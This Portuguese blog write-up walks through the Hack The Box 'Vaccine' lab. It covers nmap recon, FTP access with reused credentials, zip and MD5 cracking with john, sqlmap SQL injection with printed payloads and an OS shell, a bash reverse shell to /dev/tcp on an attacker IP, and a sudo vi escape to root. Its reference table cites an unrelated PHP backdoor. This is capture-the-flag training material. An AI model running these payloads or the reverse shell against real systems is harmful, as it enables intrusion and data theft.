---
title: HTB Vaccine Writeup
author: Hastur
date: 2021-09-06 21:00:00 -0300
categories: [Writeups, Hack The Box]
tags: [HTB, Starting point, Linux, Very Easy, SQLi]
image: /img/htb/htb-vaccine-logo.png
alt: "HTB Vaccine Writeup"
---

<img src="/img/htb/htb-vaccine-logo.png">

<br>


| Nome | Vaccine     |
|------|-------------|
|IP    | 10.10.10.46 |
|Pontos| 0           |
|OS    | Linux       |
|Nível | Very Easy   |

<br>

## RECON

### Nmap
```bash
┌──(hastur㉿hastur)-[~/Vaccine]
└─$ sudo nmap -v -p- -sCV -O -Pn 10.10.10.46 --min-rate=512
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

```
Encontramos somente as portas 21, 22 e 80 abertas. Vamos começar pela porta 80.

### Porta 80

<img src="/img/htb/htb-vaccine-1.png">

Nos deparamos com uma página de login, tentei reaproveitar as credenciais da máquina anterior ([Oopsie](https://hastur666.github.io/posts/htb-oopsie-writeup/)), mas não obtive sucesso.

A busca por diretórios com `gobuster`, tabmém não retornou nada.

Pensando fora da caixa, temos a porta 21 rodando `vsftpd 3.0.3`, e na máquina Oopsie, durante a pós exploração, encontramos credenciais para um acesso FTP `ftpuser:mc@F1l3ZilL4`.

### Porta 21

<img src="/img/htb/htb-vaccine-2.png">

As credenciais vazadas no ultimo lab são válidas!!

Explorando o FTP, encontramos o arquivo `backup.zip`, vamos baixá-lo e extrair para enumerar seu conteúdo.

<img src="/img/htb/htb-vaccine-3.png">

O arquivo está protegido por senha, as tentativas de reutilizar as senhas que já temos, não tiveram sucesso.

Podemos extrair a hash do arquivo e tentar quebrá-la, para isso vamos utilizar o `zip2john`.

```bash
┌──(hastur㉿hastur)-[~/Vaccine]
└─$ zip2john backup.zip > hash                                                                                                                                                                                                          82 ⨯
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

Com a hash em mãos, podemos utilizar o próprio `John` para tentar quebrá-la com a wordlist `rockyou.txt`.

```bash
┌──(hastur㉿hastur)-[~/Vaccine]
└─$ john hash -wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)
1g 0:00:00:00 DONE (2021-09-06 21:24) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Encontramos a sena `741852963`, vamos descompactar o arquivo e enumerar seu conteúdo.

```bash
┌──(hastur㉿hastur)-[~/Vaccine]
└─$ unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css               
                                                                                                                                                                                                                                             
┌──(hastur㉿hastur)-[~/Vaccine]
└─$ ls -la
total 24
drwxr-xr-x  2 hastur hastur 4096 Sep  6 21:25 .
drwxr-xr-x 31 hastur hastur 4096 Sep  6 20:54 ..
-rw-r--r--  1 hastur hastur 2533 Sep  6 21:20 backup.zip
-rw-r--r--  1 hastur hastur 2186 Sep  6 21:23 hash
-rw-r--r--  1 hastur hastur 2594 Feb  3  2020 index.php
-rw-r--r--  1 hastur hastur 3274 Feb  3  2020 style.css
```
Temos 2 arquivos, um index.php e uma folha css, vamos checar o conteúdo de index.php.

```bash
┌──(hastur㉿hastur)-[~/Vaccine]
└─$ cat index.php 
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```

Encontramos uma função que compara a senha criptografada em `MD5` inserida, com uma hash para o usuário `admin`.

Podemos salvar esta hash em um novo arquivo, e tentar quebrá-la novamente com o `John`.

```bash
┌──(hastur㉿hastur)-[~/Vaccine]
└─$ echo '2cb42f8734ea607eefed3b70af13bbd3' > hashZip
                                                                                                                                                                                                                                             
┌──(hastur㉿hastur)-[~/Vaccine]
└─$ john hashZip --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty789        (?)
1g 0:00:00:00 DONE (2021-09-06 21:28) 100.0g/s 10022Kp/s 10022Kc/s 10022KC/s shunda..pogimo
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```
Agora temos as credencias `admin:qwerty789`, vamos tentar validá-las na página de login.

<img src="/img/htb/htb-vaccine-4.png">

Conseguimos autenticação com sucesso!!!

Ao analizar a página, temos uma tela de dashboard, onde podemos pesquisar por alguma coisa que ainda não está clara.

Porém, ao efetuar qualquer pesquisa, percebemos que a página utiliza um parâmetro `GET` na url, que provavelmente busca em uma fonte de dados, possívelmente um banco.

Podemos testar para SQLi (SQL Injection), mas como esta página só é carregada após o login, precisamos anotar o cookie da nossa sessão antes de tentar qualquer ferramente para testes.

Ao pressionar `F12` no navegador, no meu caso `Firefox`, vemos a barra de inspeção, ao clicarmos em `Storage`, podemos obter o cookie da sessão.

<img src="/img/htb/htb-vaccine-5.png">

Temos o cooke `PHPSESSID=u8mds2v44ve1kglnmg8s6l90d6`, vamos utilizar o `sqlmap` para testar SQLi.

```bash
┌──(hastur㉿hastur)-[~/Vaccine]
└─$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=hastur' --cookie='PHPSESSID=u8mds2v44ve1kglnmg8s6l90d6'
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.8#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:46:38 /2021-09-06/

[21:46:38] [INFO] testing connection to the target URL
[21:46:39] [INFO] testing if the target URL content is stable
[21:46:39] [INFO] target URL content is stable
[21:46:39] [INFO] testing if GET parameter 'search' is dynamic
[21:46:39] [WARNING] GET parameter 'search' does not appear to be dynamic
[21:46:40] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
[21:46:40] [INFO] testing for SQL injection on GET parameter 'search'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 
[21:46:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:46:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:46:48] [INFO] testing 'Generic inline queries'
[21:46:49] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[21:46:50] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
[21:46:50] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[21:46:50] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
[21:46:50] [INFO] testing 'PostgreSQL inline queries'
[21:46:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[21:46:50] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                                                                                                     
[21:47:02] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
[21:47:02] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[21:47:13] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
[21:47:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=hastur' AND (SELECT (CASE WHEN (7267=7267) THEN NULL ELSE CAST((CHR(110)||CHR(79)||CHR(104)||CHR(68)) AS NUMERIC) END)) IS NULL-- CbRO

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=hastur' AND 5008=CAST((CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (5008=5008) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC)-- MjRn

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=hastur';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=hastur' AND 1622=(SELECT 1622 FROM PG_SLEEP(5))-- kNKY
---
[21:47:16] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[21:47:18] [INFO] fetched data logged to text files under '/home/hastur/.local/share/sqlmap/output/10.10.10.46'

[*] ending @ 21:47:18 /2021-09-06/
```
Ótimo, encontramos uma vulnerabilidade!!

Podemos tentar um reverse shell com o próprio sqlmap, inserindo o parâmetro `--os-shell` na mesma requisição que fizemos.

```bash
┌──(hastur㉿hastur)-[~/Vaccine]
└─$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=hastur' --cookie='PHPSESSID=u8mds2v44ve1kglnmg8s6l90d6' --os-shell
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.5.8#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:49:32 /2021-09-06/

[21:49:32] [INFO] resuming back-end DBMS 'postgresql' 
[21:49:32] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=hastur' AND (SELECT (CASE WHEN (7267=7267) THEN NULL ELSE CAST((CHR(110)||CHR(79)||CHR(104)||CHR(68)) AS NUMERIC) END)) IS NULL-- CbRO

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=hastur' AND 5008=CAST((CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (5008=5008) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC)-- MjRn

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=hastur';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=hastur' AND 1622=(SELECT 1622 FROM PG_SLEEP(5))-- kNKY
---
[21:49:32] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[21:49:32] [INFO] fingerprinting the back-end DBMS operating system
[21:49:33] [INFO] the back-end DBMS operating system is Linux
[21:49:33] [INFO] testing if current user is DBA
[21:49:34] [INFO] retrieved: '1'
[21:49:34] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[21:49:34] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> id 
do you want to retrieve the command standard output? [Y/n/a] n
[21:49:41] [INFO] retrieved: 'uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)'
os-shell> ls -la
do you want to retrieve the command standard output? [Y/n/a] n
[21:49:48] [INFO] retrieved: 'total 92'
[21:49:49] [INFO] retrieved: 'drwx------ 19 postgres postgres 4096 Sep  7 01:00 .'
[21:49:49] [INFO] retrieved: 'drwxr-xr-x  3 postgres postgres 4096 Feb  3  2020 ..'
[21:49:49] [INFO] retrieved: 'drwx------  6 postgres postgres 4096 Feb  3  2020 base'
[21:49:49] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Sep  7 01:03 global'
[21:49:49] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Feb  3  2020 pg_commit_ts'
[21:49:50] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Feb  3  2020 pg_dynshmem'
[21:49:50] [INFO] retrieved: 'drwx------  4 postgres postgres 4096 Sep  7 01:00 pg_logical'
[21:49:50] [INFO] retrieved: 'drwx------  4 postgres postgres 4096 Feb  3  2020 pg_multixact'
[21:49:50] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Sep  7 01:00 pg_notify'
[21:49:50] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Feb  3  2020 pg_replslot'
[21:49:51] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Feb  3  2020 pg_serial'
[21:49:51] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Feb  3  2020 pg_snapshots'
[21:49:51] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Sep  7 01:00 pg_stat'
[21:49:51] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Feb  3  2020 pg_stat_tmp'
[21:49:51] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Feb  3  2020 pg_subtrans'
[21:49:52] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Feb  3  2020 pg_tblspc'
[21:49:52] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Feb  3  2020 pg_twophase'
[21:49:52] [INFO] retrieved: '-rw-------  1 postgres postgres    3 Feb  3  2020 PG_VERSION'
[21:49:52] [INFO] retrieved: 'drwx------  3 postgres postgres 4096 Feb  3  2020 pg_wal'
[21:49:53] [INFO] retrieved: 'drwx------  2 postgres postgres 4096 Feb  3  2020 pg_xact'
[21:49:53] [INFO] retrieved: '-rw-------  1 postgres postgres   88 Feb  3  2020 postgresql.auto.conf'
[21:49:53] [INFO] retrieved: '-rw-------  1 postgres postgres  130 Sep  7 01:00 postmaster.opts'
[21:49:53] [INFO] retrieved: '-rw-------  1 postgres postgres  108 Sep  7 01:00 postmaster.pid'
os-shell> 
```
Conseguimos um shell com o usuário `postgres`!!!

Podemos melhorar este shell com um reverse shell utilizando o netcat, vamos seter um netcat na porta 8443 e enviar um payload.

```bash
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.15.185/8443 0>&1'
do you want to retrieve the command standard output? [Y/n/a] n
[21:55:24] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
```
E conseguimos o shell.

<img src="/img/htb/htb-vaccine-6.png">

## Escalação de privilégios

Esta máquina não possui a flag `user.txt`, então precisamos escalar privilégios para conseguir a `root.txt`.

Após enumerar vários diretórios, encontrei a senha do user `postgres`, dentro do arquivo `dashboard.php` no diretório `/var/www/html`.

```bash
postgres@vaccine:/var/www/html$ cat dashboard.php
cat dashboard.php
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Admin Dashboard</title>
  <link rel="stylesheet" href="./dashboard.css">
  <script src="https://use.fontawesome.com/33a3739634.js"></script>

---------CORTADO---------

        try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
        }
```

Agora podemos ver se o usuário possui permissão de `sudo`.

<img src="/img/htb/htb-vaccine-7.png">

Ótimo, o usuário postgres tem permissão administrativa para editar o arquivo `/etc/postgresql/11/main/pg_hba.conf` com o utilitário `vi`.

O vi, aceita parâmetros para executar comandos do SO, se rodarmos o comando conforme ns apresentado com permissão administrativa, e logo em seguida pressionarmos `ESC > :!/bin/sh` teremos um shell como `root`.

<img src="/img/htb/htb-vaccine-8.png">

E conseguimos o shell como `root`!!!

A flag se encontra em seu diretório.

E comprometemos o server!!
<br>

<img src="/img/htb/hackerman.gif">
<br>
### Referências

| Vulnerabilidade                           | Url                                                                                                             |
|-------------------------------------------|-----------------------------------------------------------------------------------------------------------------|
| PHP 8.1.0-dev development version backdoor| [https://github.com/flast101/php-8.1.0-dev-backdoor-rce](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)|


